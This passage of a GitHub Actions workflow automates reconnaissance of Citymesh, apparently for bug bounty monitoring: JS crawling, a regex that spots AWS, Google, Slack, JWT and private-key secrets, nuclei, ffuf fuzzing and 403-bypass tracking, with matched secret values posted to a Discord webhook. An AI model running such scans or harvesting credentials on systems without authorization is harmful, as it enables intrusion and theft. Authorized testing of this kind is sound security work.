                 -jc \
                 -silent \
                 -rate-limit 10 \
                 -depth 2 \
            | grep -E '\.js($|\?)' | sort -u > results/js_urls_current.txt || touch results/js_urls_current.txt

      - name: Download JS files and scan for secrets
        run: |
          mkdir -p js_files
          > results/js_secrets_current.txt

          # Secret patterns: AWS keys, Google API keys, Slack tokens, JWTs, private keys, generic api_key assignments
          PATTERN="(AKIA[0-9A-Z]{16})|(AIza[0-9A-Za-z_-]{35})|(xox[baprs]-[0-9A-Za-z-]{10,})|(eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})|(-----BEGIN [A-Z ]*PRIVATE KEY-----)|([Aa]pi[_-]?[Kk]ey.{0,3}[:=].{0,3}[A-Za-z0-9_-]{16,})"

          COUNT=0
          while IFS= read -r jsurl; do
            [ -z "$jsurl" ] && continue
            COUNT=$((COUNT+1))
            # cap how many JS files we pull per run to stay light on the target
            if [ "$COUNT" -gt 100 ]; then
              echo "JS file cap (100) reached, stopping"
              break
            fi
            FNAME="js_files/$(echo "$jsurl" | sha1sum | cut -d' ' -f1).js"
            curl -s --max-time 10 -o "$FNAME" "$jsurl" || continue
            MATCHES=$(grep -E -o "$PATTERN" "$FNAME" 2>/dev/null | sort -u || true)
            if [ -n "$MATCHES" ]; then
              while IFS= read -r m; do
                echo "$jsurl | $m" >> results/js_secrets_current.txt
              done <<< "$MATCHES"
            fi
          done < results/js_urls_current.txt
          sort -u results/js_secrets_current.txt -o results/js_secrets_current.txt

      - name: Diff JS secret findings against previous run
        id: js_diff
        run: |
          if [ -f results/js_secrets_previous.txt ]; then
            comm -13 results/js_secrets_previous.txt results/js_secrets_current.txt > results/js_secrets_new.txt
          else
            cp results/js_secrets_current.txt results/js_secrets_new.txt
          fi
          NEW_SECRETS=$(wc -l < results/js_secrets_new.txt | tr -d ' ')
          echo "new_secrets=$NEW_SECRETS" >> "$GITHUB_OUTPUT"

      - name: Notify Discord if new JS secrets found
        if: steps.js_diff.outputs.new_secrets != '0'
        run: |
          # Note: matched secret values are included — this channel should be private
          FINDINGS=$(head -c 1700 results/js_secrets_new.txt)
          CONTENT=$(printf "**Possible secrets found in JS files (Citymesh) — verify manually before reporting:**\n\`\`\`\n%s\n\`\`\`" "$FINDINGS")
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"

      - name: Update previous results
        run: |
          cp results/current.txt results/previous.txt
          cp results/current_alive.txt results/previous_alive.txt
          cp results/current_alive_hosts.txt results/previous_alive_hosts.txt
          cp results/nuclei_current.txt results/nuclei_previous.txt
          cp results/ffuf_current.txt results/ffuf_previous.txt
          cp results/bypass_current.txt results/bypass_previous.txt
          cp results/js_secrets_current.txt results/js_secrets_previous.txt

      - name: Commit updated results
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add results/previous.txt results/previous_alive.txt results/previous_alive_hosts.txt results/nuclei_previous.txt results/ffuf_previous.txt results/bypass_previous.txt results/js_secrets_previous.txt
          git diff --cached --quiet || git commit -m "Update baselines [skip ci]"
          git push

      - name: Write job summary
        if: always()
        run: |
          TOTAL_SUBS=$(wc -l < results/current.txt 2>/dev/null | tr -d ' ' || echo 0)
          ALIVE_SUBS=$(wc -l < results/current_alive_hosts.txt 2>/dev/null | tr -d ' ' || echo 0)
          NEW_SUBS=$(wc -l < results/new_hosts.txt 2>/dev/null | tr -d ' ' || echo 0)
          TOTAL_NUCLEI=$(wc -l < results/nuclei_current.txt 2>/dev/null | tr -d ' ' || echo 0)
          NEW_NUCLEI=$(wc -l < results/nuclei_new.txt 2>/dev/null | tr -d ' ' || echo 0)
          FUZZED_HOSTS=$(wc -l < results/ffuf_targets.txt 2>/dev/null | tr -d ' ' || echo 0)
          TOTAL_PATHS=$(wc -l < results/ffuf_current.txt 2>/dev/null | tr -d ' ' || echo 0)
          NEW_PATHS=$(wc -l < results/ffuf_new.txt 2>/dev/null | tr -d ' ' || echo 0)
          TOTAL_BYPASSES=$(wc -l < results/bypass_current.txt 2>/dev/null | tr -d ' ' || echo 0)
          NEW_BYPASSES=$(wc -l < results/bypass_new.txt 2>/dev/null | tr -d ' ' || echo 0)
          JS_FILES_SCANNED=$(wc -l < results/js_urls_current.txt 2>/dev/null | tr -d ' ' || echo 0)
          TOTAL_SECRETS=$(wc -l < results/js_secrets_current.txt 2>/dev/null | tr -d ' ' || echo 0)
          NEW_SECRETS=$(wc -l < results/js_secrets_new.txt 2>/dev/null | tr -d ' ' || echo 0)
          PRIORITIZED="${{ steps.prioritize.outputs.prioritized }}"

          {
            echo "## Citymesh Monitor — Run Summary"
            echo ""
            echo "Run time: $(date -u '+%Y-%m-%d %H:%M UTC')"
            echo ""
            echo "| Stage | Total | New this run |"
            echo "|---|---|---|"
            echo "| Subdomains found | $TOTAL_SUBS | — |"
            echo "| Live hosts | $ALIVE_SUBS | $NEW_SUBS |"
            echo "| Nuclei findings | $TOTAL_NUCLEI | $NEW_NUCLEI |"
            echo "| Hosts fuzzed ($FUZZED_HOSTS/$ALIVE_SUBS, AI-prioritized: $PRIORITIZED) | — | — |"
            echo "| Directory paths | $TOTAL_PATHS | $NEW_PATHS |"
            echo "| 403 bypasses found | $TOTAL_BYPASSES | $NEW_BYPASSES |"
            echo "| JS files scanned | $JS_FILES_SCANNED | — |"
            echo "| Possible JS secrets | $TOTAL_SECRETS | $NEW_SECRETS |"
            echo ""
            if [ "$NEW_SUBS" = "0" ] && [ "$NEW_NUCLEI" = "0" ] && [ "$NEW_PATHS" = "0" ] && [ "$NEW_BYPASSES" = "0" ] && [ "$NEW_SECRETS" = "0" ]; then
              echo "No new findings this run — baseline unchanged."
            else
              echo "New findings this run — check Discord for details, or the \`results/\` artifacts below."
            fi
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Upload full results as workflow artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: scan-results-${{ github.run_number }}
          path: results/
          retention-days: 14
